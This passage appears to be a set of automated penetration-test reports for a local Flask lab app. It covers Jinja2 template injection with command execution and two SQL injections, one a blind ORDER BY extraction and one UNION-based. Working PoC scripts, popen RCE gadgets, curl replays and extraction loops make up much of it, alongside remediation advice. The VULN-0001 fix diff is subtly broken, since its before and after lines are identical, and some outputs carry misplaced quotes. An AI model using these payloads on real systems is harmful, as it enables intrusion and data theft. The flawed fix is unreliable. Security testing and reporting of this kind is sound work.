│                                                                              │
│  print("== transport checks ==")                                             │
│  print("GET  /render            ->", S.get(BASE + "/render").status_code)    │
│  # 405                                                                       │
│  print("PUT  /render            ->", S.put(BASE + "/render", data={"tpl":    │
│  "{{7*7}}"}).status_code)  # 405                                             │
│  print("POST query-string only  ->", S.post(BASE + "/render",                │
│  params={"tpl": "{{7*7}}"}, data={}).text)  # hello                          │
│  print("POST json body          ->", S.post(BASE + "/render", json={"tpl":   │
│  "{{7*7}}"}).text)  # hello                                                  │
│                                                                              │
│  print("\n== engine fingerprint ==")                                         │
│  for payload in ["hello", "{{7*7}}", "{{7*8}}", "{{7*'7'}}", "${7*7}", "<%=  │
│  7*7 %>", "#{7*7}"]:                                                         │
│      print(f"{payload!r:20} -> {send(payload)[1]!r}")                        │
│                                                                              │
│  print("\n== internal object access ==")                                     │
│  print("{{config}}                     ->", send("{{config}}")[1][:80])      │
│  print("{{lipsum.__globals__}}         ->",                                  │
│  send("{{lipsum.__globals__}}")[1][:80])                                     │
│                                                                              │
│  print("\n== command execution ==")                                          │
│  for cmd in ["id", "uname -a", "cat /etc/hostname"]:                         │
│      payload = "{{cycler.__init__.__globals__.os.popen('%s').read()}}" %     │
│  cmd                                                                         │
│      status, body = send(payload)                                            │
│      print(f"$ {cmd}\n{body.strip()}\n")                                     │
│                                                                              │
│  # Alternate gadgets, same primitive                                         │
│  alt = "{{lipsum.__globals__['os'].popen('id').read()}}"                     │
│  print("$ id (lipsum gadget)\n" + send(alt)[1].strip())                      │
│  alt2 =                                                                      │
│  "{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id  │
│  ').read()}}"                                                                │
│  print("$ id (builtins gadget)\n" + send(alt2)[1].strip())                   │
│                                                                              │
│  # Raw wire format that triggers RCE (form-encoded)                          │
│  print("\nraw request bytes:")                                               │
│  print("POST /render HTTP/1.1\r\nHost: 127.0.0.1:8099\r\n"                   │
│        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length:   │
│  77\r\n\r\n"                                                                 │
│        "tpl=%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%2  │
│  8%29%7D%7D")                                                                │
│  ```                                                                         │
│                                                                              │
│  ```bash                                                                     │
│  # Minimal curl reproductions                                                │
│  curl -s -X POST --data-urlencode 'tpl={{7*7}}'                              │
│  http://127.0.0.1:8099/render                                                │
│  curl -s -X POST --data-urlencode                                            │
│  "tpl={{cycler.__init__.__globals__.os.popen('id').read()}}"                 │
│  http://127.0.0.1:8099/render                                                │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:42-43                                                  │
│    Sink: unvalidated form value passed as template source to                 │
│  render_template_string                                                      │
│        tpl = request.form.get("tpl", "hello")                                │
│      return render_template_string(tpl)                                      │
│    Fix:                                                                      │
│    -     value = request.form.get("tpl", "hello")                            │
│      return render_template_string("{{ value }}", value=value)               │
│    +     value = request.form.get("tpl", "hello")                            │
│      return render_template_string("{{ value }}", value=value)               │
│                                                                              │
│  Remediation                                                                 │
│  Never pass user input to `render_template_string`, `Template(...)`,         │
│  `Environment.from_string`, or any other API that treats the input as        │
│  template source. Render a fixed template stored in the application and      │
│  pass the user's value as a context variable so the template engine escapes  │
│  it as data; the value is then never parsed as template syntax. If users     │
│  genuinely must author template fragments, compile them with                 │
│  `jinja2.sandbox.SandboxedEnvironment` configured with an explicit           │
│  allowlist of globals, filters, and attributes, and enforce a strict deny    │
│  of dunder attributes, `__globals__`, `__builtins__`, `__class__`,           │
│  `__subclasses__` and any callable that reaches the filesystem or process    │
│  APIs — and still treat this as defense in depth rather than a guarantee.    │
│  Additionally, strip or reject the template delimiters `{{`, `{%`, `{#` on   │
│  this field as an input-level backstop, apply a maximum input length, and    │
│  ensure the service account runs with the least privilege required so a      │
│  future engine-level failure cannot escalate to host-level command           │
│  execution. Where the field is only meant to carry display text, prefer      │
│  `Markup.escape`-style output encoding and a Jinja environment with          │
│  `autoescape=True` for any HTML surface.                                     │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection via ORDER BY clause in GET /orders sort parameter      │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: Flask orders application (app.py)                                   │
│                                                                              │
│  Endpoint: /orders?sort=                                                     │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The `sort` query parameter of `GET /orders` is interpolated directly into   │
│  the `ORDER BY` clause of a SQLite statement, allowing arbitrary SQL         │
│  expressions to be injected. Because a sort expression produces no visible   │
│  output, the flaw yields a fully deterministic **blind boolean oracle**: an  │
│  attacker defines a predicate over any table and reads its truth value from  │
│  the ordering of the returned rows. Using that oracle, the `note` column     │
│  (which the query never selects) was extracted character by character, and   │
│  the database version and schema were enumerated.                            │
│                                                                              │
│  Impact                                                                      │
│  Any unauthenticated caller can read arbitrary data from the database that   │
│  the endpoint never returns. With roughly one request per candidate          │
│  character, the confirmation extracted the complete contents of the `note`   │
│  column of `orders` (`flag{orderby_ok}`), the SQLite engine version          │
│  (`3.53.4`) and the schema inventory of the database. The same oracle        │
│  generalises to every table, so any data stored in the backend database —    │
│  credentials, tokens, personal data — is retrievable at the rate of a few    │
│  dozen requests per value. No write primitive was demonstrated on this sink  │
│  (stacked statements are rejected by the driver), so the demonstrated        │
│  impact is confidentiality loss.                                             │
│                                                                              │
│  Technical Analysis                                                          │
│  The route reads the parameter with no validation and embeds it verbatim     │
│  into the SQL text:                                                          │
│                                                                              │
│  ```python title=app.py startLineNumber=22 endLineNumber=28                  │
│  @app.route("/orders")                                                       │
│  def orders():                                                               │
│      # (1) ORDER BY injection: value is interpolated, not bound              │
│      sort = request.args.get("sort", "id")                                   │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│      return jsonify(rows)                                                    │
│  ```                                                                         │
│                                                                              │
│  The f-string at line 27 places attacker-controlled text into the `ORDER     │
│  BY` position. `ORDER BY` does not accept a bound parameter, so the          │
│  ordinary parameterisation fix does not apply — the clause must instead be   │
│  built from a server-side allowlist of column names.                         │
│                                                                              │
│  Behavioural confirmation that the parameter lands in SQL syntax (not a      │
│  string literal):                                                            │
│                                                                              │
│  - `sort=id` → `[[1,"alpha",3],[2,"beta",7],[3,"gamma",1]]`                  │
│  - `sort=qty` → `[[3,"gamma",1],[1,"alpha",3],[2,"beta",7]]`                 │
│  - `sort=nosuchcol` → HTTP 500 `sqlite3.OperationalError: no such column:    │
│  nosuchcol`, i.e. the driver parsed the value as an identifier.              │
│  - `sort=proxyprobe1` → HTTP 500 `no such column: proxyprobe1`.              │
│                                                                              │
│  **Exfiltration channel.** The endpoint returns only `id, sku, qty`, so a    │
│  sub-select used as the sort key leaks nothing directly. Injecting a `CASE`  │
│  expression instead turns row ordering into a one-bit output channel:        │
│                                                                              │
│  ```sql                                                                      │
│  ORDER BY (CASE WHEN (<arbitrary predicate>) THEN id ELSE qty END)           │
│  ```                                                                         │
│                                                                              │
│  When the predicate is true the result set is ordered by `id` (rows          │
│  `1,2,3`); when false it is ordered by `qty` (rows `3,1,2`). Both reference  │
│  orderings are distinct and stable, so the oracle is deterministic, needs    │
│  no timing measurement, and tolerates parallel traffic. Predicates may       │
│  contain arbitrary `SELECT` sub-queries, which is what makes total data      │
│  extraction possible:                                                        │
│                                                                              │
│  ```sql                                                                      │
│  ORDER BY (CASE WHEN (SELECT substr(note,1,5) FROM orders WHERE              │
│  id=1)='flag{'                                                               │
│                  THEN id ELSE qty END)                                       │
│  ```                                                                         │
│                                                                              │
│  Because `sqlite_master` is reachable from a predicate, `SELECT              │
│  substr(group_concat(name),<i>,1) FROM sqlite_master` enumerates every       │
│  schema object, and the same construction reads any column of any table.     │
│  Multi-statement payloads (`sort=id; UPDATE ...`) are rejected by            │
│  `sqlite3.Connection.execute`, and `UNION` is not valid grammar inside       │
│  `ORDER BY`, so the proven capability is read-only — confidentiality loss    │
│  rather than data modification.                                              │
│                                                                              │
│  PoC Description                                                             │
│  1. Confirm the parameter changes row ordering legitimately: request         │
│  `/orders?sort=id` (rows ordered 1,2,3) and `/orders?sort=qty` (rows         │
│  ordered 3,1,2). Record both as the two reference orderings.                 │
│  2. Confirm the value is parsed as SQL syntax rather than a literal:         │
│  request `/orders?sort=nosuchcol` and observe the HTTP 500 with `no such     │
│  column: nosuchcol`.                                                         │
│  3. Send the blind predicate `/orders?sort=(CASE WHEN (SELECT                │
│  substr(note,1,5) FROM orders WHERE id=1)='flag{' THEN id ELSE qty END)`     │
│  and observe the response ordered 1,2,3 (predicate true).                    │
│  4. Send the same request with a deliberately false predicate (`='zzzz{'`)   │
│  and observe the response ordered 3,1,2 (predicate false). The response      │
│  body is byte-identical in length, so only ordering distinguishes the        │
│  cases.                                                                      │
│  5. Automate steps 3–4 over an alphabet and character positions to recover   │
│  the full `note` value of the first row, then over `sqlite_master` to        │
│  recover the schema and `sqlite_version()`.                                  │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  """Blind SQL injection via ORDER BY in GET /orders?sort= -- deterministic   │
│  PoC.                                                                        │
│                                                                              │
│  Usage: python3 poc_order_by.py http://<host>:<port>                         │
│  """                                                                         │
│  import string                                                               │
│  import sys                                                                  │
│  import requests                                                             │
│                                                                              │
│  BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8098"        │
│                                                                              │
│  s = requests.Session()                                                      │
│  s.trust_env = False                                                         │
│  s.proxies = {"http": None, "https": None}                                   │
│                                                                              │
│                                                                              │
│  def order(sort):                                                            │
│      r = s.get(BASE + "/orders", params={"sort": sort}, timeout=10)          │
│      r.raise_for_status()                                                    │
│      return r.json()                                                         │
│                                                                              │
│                                                                              │
│  # Two stable reference orderings produced by legitimate requests.           │
│  REF_TRUE = order("id")    # [[1,"alpha",3],[2,"beta",7],[3,"gamma",1]]      │
│  REF_FALSE = order("qty")  # [[3,"gamma",1],[1,"alpha",3],[2,"beta",7]]      │
│  assert REF_TRUE != REF_FALSE                                                │
│                                                                              │
│                                                                              │
│  def oracle(expr):                                                           │
│      """True/False for an arbitrary SQL predicate, read from row ordering    │
│  alone."""                                                                   │
│      rows = order(f"(CASE WHEN ({expr}) THEN id ELSE qty END)")              │
│      if rows == REF_TRUE:                                                    │
│          return True                                                         │
│      if rows == REF_FALSE:                                                   │
│          return False                                                        │
│      raise RuntimeError(f"unexpected ordering: {rows}")                      │
│                                                                              │
│                                                                              │
│  # 1) Engine version                                                         │
│  version = ""                                                                │
│  for i in range(1, 20):                                                      │
│      for ch in string.digits + ".":                                          │
│          if oracle(f"SELECT substr(sqlite_version(),{i},1)='{ch}' FROM       │
│  orders LIMIT 1"):                                                           │
│              version += ch                                                   │
│              break                                                           │
│      else:                                                                   │
│          break                                                               │
│  print("sqlite_version():", version)                                         │
│                                                                              │
│  # 2) Schema object names                                                    │
│  names = ""                                                                  │
│  for i in range(1, 60):                                                      │
│      for ch in "_" + string.ascii_lowercase + string.digits:                 │
│          if oracle(f"SELECT substr(group_concat(name),'{i}','1')='{ch}'      │
│  FROM sqlite_master"):                                                       │
│              names += ch                                                     │
│              break                                                           │
│      else:                                                                   │
│          break                                                               │
│  print("sqlite_master names:", names)                                        │
│                                                                              │
│  # 3) The note column, which /orders never returns                           │
│  flag = ""                                                                   │
│  for pos in range(1, 33):                                                    │
│      for ch in "flag{}_" + string.ascii_lowercase:                           │
│          if oracle(f"SELECT substr(note,{pos},1)='{ch}' FROM orders WHERE    │
│  id=1"):                                                                     │
│              flag += ch                                                      │
│              break                                                           │
│      else:                                                                   │
│          break                                                               │
│  print("orders.note (id=1):", flag)                                          │
│  assert flag == "flag{orderby_ok}", flag                                     │
│  print("[+] blind extraction complete")                                      │
│  ```                                                                         │
│                                                                              │
│  Minimal replay of the single boolean step:                                  │
│                                                                              │
│  ```                                                                         │
│  curl 'http://<host>:<port>/orders?sort=id'                                  │
│  curl 'http://<host>:<port>/orders?sort=qty'                                 │
│  curl -G --data-urlencode "sort=(CASE WHEN (SELECT substr(note,1,5) FROM     │
│  orders WHERE id=1)='flag{' THEN id ELSE qty END)"                           │
│  'http://<host>:<port>/orders'                                               │
│  curl -G --data-urlencode "sort=(CASE WHEN (SELECT substr(note,1,5) FROM     │
│  orders WHERE id=1)='zzzz{' THEN id ELSE qty END)"                           │
│  'http://<host>:<port>/orders'                                               │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:24-27                                                  │
│    ORDER BY injection sink: interpolated sort value + unsafe execute         │
│        # (1) ORDER BY injection: value is interpolated, not bound            │
│      sort = request.args.get("sort", "id")                                   │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    Fix:                                                                      │
│    -     # (1) ORDER BY injection: value is interpolated, not bound          │
│      sort = request.args.get("sort", "id")                                   │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    +     # Sort column and direction are chosen from fixed server-side       │
│  allowlists.                                                                 │
│      sort_columns = {"id": "id", "sku": "sku", "qty": "qty"}                 │
│      name, _, direction = request.args.get("sort",                           │
│  "id").strip().partition(" ")                                                │
│      sort_col = sort_columns.get(name.lower(), "id")                         │
│      requested_dir = direction.strip().lower() or request.args.get("dir",    │
│  "").strip().lower()                                                         │
│      sort_dir = "DESC" if requested_dir == "desc" else "ASC"                 │
│      order_by = f"{sort_col} {sort_dir}"                                     │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {order_by}").fetchall()                                                     │
│                                                                              │
│  Remediation                                                                 │
│  Never build an `ORDER BY` clause from raw request input. Replace the        │
│  free-form `sort` value with a server-side allowlist that maps a small set   │
│  of accepted public names to fixed SQL fragments — for example `id`, `sku`,  │
│  `qty` — and fall back to a safe default when the supplied value is not in   │
│  the map. Keep the sort direction as a separate parameter constrained to     │
│  the two literals `ASC` and `DESC` rather than accepting combined input      │
│  such as `id DESC`. Because column identifiers cannot be bound as            │
│  parameters, the allowlist is the control, not parameterisation; apply it    │
│  before the value reaches the query and reject unknown keys rather than      │
│  interpolating them.                                                         │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in POST /orders/by-sku JSON sku field (UNION-based     │
│  data and schema disclosure)                                                 │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: Flask orders application (app.py)                                   │
│                                                                              │
│  Endpoint: /orders/by-sku                                                    │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The `sku` field of the JSON body posted to `POST /orders/by-sku` is         │
│  interpolated into a quoted string literal in a SQLite `WHERE` clause. A     │
│  single-quote character breaks out of the literal, allowing boolean          │
│  conditions and `UNION SELECT` statements to be appended. The confirmation   │
│  retrieved every row of the `orders` table — including the `note` column     │
│  the endpoint exposes for only one row — and dumped the table schema and     │
│  engine version.                                                             │
│                                                                              │
│  Impact                                                                      │
│  Any unauthenticated caller can read arbitrary data from the backend         │
│  database, bypassing the intended single-row lookup entirely. The endpoint   │
│  normally returns the `note` column for exactly the one row whose `sku`      │
│  matches; the confirmation returned the `note` values of all rows and the    │
│  complete `CREATE TABLE` definition, and the same construction reads any     │
│  other table or column in the database — for example other users' records    │
│  or credentials if they were stored there. Because results come back         │
│  in-band in the JSON response, extraction is fast: one request per row or    │
│  per concatenated value, rather than one request per character.              │
│                                                                              │
│  Technical Analysis                                                          │
│  The route reads the JSON body, extracts `sku`, and interpolates it          │
│  directly into a single-quoted string literal:                               │
│                                                                              │
│  ```python title=app.py startLineNumber=30 endLineNumber=37                  │
│  @app.route("/orders/by-sku", methods=["POST"])                              │
│  def by_sku():                                                               │
│      # (2) POST JSON injection                                               │
│      body = request.get_json(force=True, silent=True) or {}                  │
│      sku = body.get("sku", "alpha")                                          │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =      │
│  '{sku}'").fetchall()                                                        │
│      return jsonify(rows)                                                    │
│  ```                                                                         │
│                                                                              │
│  The f-string at line 36 builds the statement, and `sku` is inserted inside  │
│  the quotes of `sku = '{sku}'`. A single quote in the value terminates the   │
│  literal, after which the attacker supplies arbitrary SQL. The result set    │
│  is returned to the client as JSON, so extraction is **in-band** — no blind  │
│  technique is needed.                                                        │
│                                                                              │
│  Step-by-step confirmation:                                                  │
│                                                                              │
│  - `{"sku":"alpha"}` → `[[1,"alpha","flag{orderby_ok"}]]` — one row, as      │
│  intended.                                                                   │
│  - `{"sku":"alpha' AND '1'='1"}` → `[[1,"alpha","flag{orderby_ok"}]]`, and   │
│  `{"sku":"alpha' AND '1'='2"}` → `[]`. The only difference between the two   │
│  requests is the injected predicate, which proves the fragment is parsed as  │
│  SQL.                                                                        │
│  - `{"sku":"x' UNION SELECT id, sku, note FROM orders WHERE '1'='1"}` → all  │
│  three rows:                                                                 │
│  `[[1,"alpha","flag{orderby_ok}"],[2,"beta","nothing"],[3,"gamma","x"]]`.    │
│  The column count and types line up with the original projection (integer,   │
│  text, text), so the union is accepted and the attacker chooses the          │
│  projection.                                                                 │
│  - `{"sku":"x' UNION SELECT 1,name,sql FROM sqlite_master WHERE '1'='1"}` →  │
│  `[[1,"orders","CREATE TABLE orders (id INTEGER PRIMARY KEY, sku TEXT, qty   │
│  INT, note TEXT)"]]`, dumping schema through the same channel;               │
│  `sqlite_version()` returns `3.53.4`.                                        │
│                                                                              │
│  Because `request.get_json(force=True, silent=True)` is used, the parser     │
│  runs regardless of the declared content type and failures are swallowed,    │
│  so there is no layer at which malformed or hostile input is rejected.       │
│  `sqlite3.Connection.execute` permits only a single statement, so stacked    │
│  `UPDATE` payloads fail with HTTP 500 and leave the table unchanged — the    │
│  demonstrated capability is read-only exfiltration, which is why integrity   │
│  and availability are rated unchanged.                                       │
│                                                                              │
│  PoC Description                                                             │
│  1. Establish the baseline: POST `{"sku":"alpha"}` to `/orders/by-sku` and   │
│  note the single returned row `[[1,"alpha","flag{orderby_ok}"]]`.            │
│  2. Prove the value is parsed as SQL by injecting a boolean: POST            │
│  `{"sku":"alpha' AND '1'='1"}` (returns the baseline row) and then           │
│  `{"sku":"alpha' AND '1'='2"}` (returns `[]`). The identical response        │
│  length with a different result confirms the condition is evaluated by the   │
│  database.                                                                   │
│  3. Prove arbitrary row access: POST `{"sku":"x' UNION SELECT id, sku, note  │
│  FROM orders WHERE '1'='1"}` and observe all three rows returned, including  │
│  `note` values the endpoint would never return for a single-SKU lookup.      │
│  4. Prove schema access: POST `{"sku":"x' UNION SELECT 1,name,sql FROM       │
│  sqlite_master WHERE '1'='1"}` and observe the `CREATE TABLE` statement for  │
│  `orders`.                                                                   │
│  5. Optionally repeat with `{"sku":"x' UNION SELECT 1, sqlite_version(),     │
│  (SELECT group_concat(name) FROM sqlite_master) WHERE '1'='1"}` for version  │
│  and object enumeration.                                                     │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  """In-band SQL injection in POST /orders/by-sku (JSON `sku`) -- PoC.        │
│                                                                              │
│  Usage: python3 poc_by_sku.py http://<host>:<port>                           │
│  """                                                                         │
│  import json                                                                 │
│  import sys                                                                  │
│  import requests                                                             │
│                                                                              │
│  BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8098"        │
│  URL = BASE + "/orders/by-sku"                                               │
│                                                                              │
│  s = requests.Session()                                                      │
│  s.trust_env = False                                                         │
│  s.proxies = {"http": None, "https": None}                                   │
│                                                                              │
│                                                                              │
│  def lookup(sku):                                                            │
│      r = s.post(URL, json={"sku": sku}, timeout=10)                          │
│      return r.status_code, r.json()                                          │
│                                                                              │
│                                                                              │
│  # 1) Baseline: one row, only its own `note`                                 │
│  print("baseline           ", lookup("alpha"))                               │
│                                                                              │
│  # 2) Boolean oracle                                                         │
│  print("bool true  '1'='1  ", lookup("alpha' AND '1'='1"))                   │
│  print("bool false '1'='2  ", lookup("alpha' AND '1'='2"))                   │
│                                                                              │
│  # 3) UNION: every row, including `note` for rows the lookup never returns   │
│  status, rows = lookup("x' UNION SELECT id, sku, note FROM orders WHERE      │
│  '1'='1")                                                                    │
│  print("union all rows     ", status, rows)                                  │
│  assert len(rows) == 3, rows                                                 │
│                                                                              │
│  # 4) UNION: schema from sqlite_master                                       │
│  status, schema = lookup("x' UNION SELECT 1,name,sql FROM sqlite_master      │
│  WHERE '1'='1")                                                              │
│  print("union schema       ", status, schema)                                │
│                                                                              │
│  # 5) UNION: version + object inventory                                      │
│  status, meta = lookup(                                                      │
│      "x' UNION SELECT 1, sqlite_version(), "                                 │
│      "(SELECT group_concat(name) FROM sqlite_master) WHERE '1'='1"           │
│  )                                                                           │
│  print("union version/meta ", status, meta)                                  │
│  ```                                                                         │
│                                                                              │
│  Minimal replay:                                                             │
│                                                                              │
│  ```                                                                         │
│  curl -X POST 'http://<host>:<port>/orders/by-sku' \                         │
│    -H 'Content-Type: application/json' -d '{"sku":"alpha"}'                  │
│                                                                              │
│  curl -X POST 'http://<host>:<port>/orders/by-sku' \                         │
│    -H 'Content-Type: application/json' -d "{\"sku\":\"alpha' AND '1'='2\"}"  │
│                                                                              │
│  curl -X POST 'http://<host>:<port>/orders/by-sku' \                         │
│    -H 'Content-Type: application/json' \                                     │
│    --data-binary '{"sku":"x'"'"' UNION SELECT id, sku, note FROM orders      │
│  WHERE '"'"'1'"'"'='"'"'1"}'                                                 │
│                                                                              │
│  curl -X POST 'http://<host>:<port>/orders/by-sku' \                         │
│    -H 'Content-Type: application/json' \                                     │
│    --data-binary '{"sku":"x'"'"' UNION SELECT 1,name,sql FROM sqlite_master  │
│  WHERE '"'"'1'"'"'='"'"'1"}'                                                 │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:35-36                                                  │
│    Parameterise the WHERE clause value                                       │
│        conn = sqlite3.connect(DB)                                            │
│      rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =      │
│  '{sku}'").fetchall()                                                        │
│    Fix:                                                                      │
│    -     conn = sqlite3.connect(DB)                                          │
│      rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =      │
│  '{sku}'").fetchall()                                                        │
│    +     conn = sqlite3.connect(DB)                                          │
│      rows = conn.execute("SELECT id, sku, note FROM orders WHERE sku = ?",   │
│  (sku,)).fetchall()                                                          │
│                                                                              │
│  Remediation                                                                 │
│  Use bound parameters for the `sku` value instead of string concatenation.   │
│  The statement text should be a constant containing a single placeholder,    │
│  with the request-derived value passed separately as the bind argument, so   │
│  the value can never be interpreted as SQL syntax. This applies to every     │
│  value position in the application, including the sibling `/orders` sort     │
│  clause, which needs an identifier allowlist because column names cannot be  │
│  bound. As defence in depth, validate that `sku` matches the expected        │
│  format before querying and return a generic error on database exceptions    │
│  rather than letting driver messages reach the client.                       │
│                                                                              │
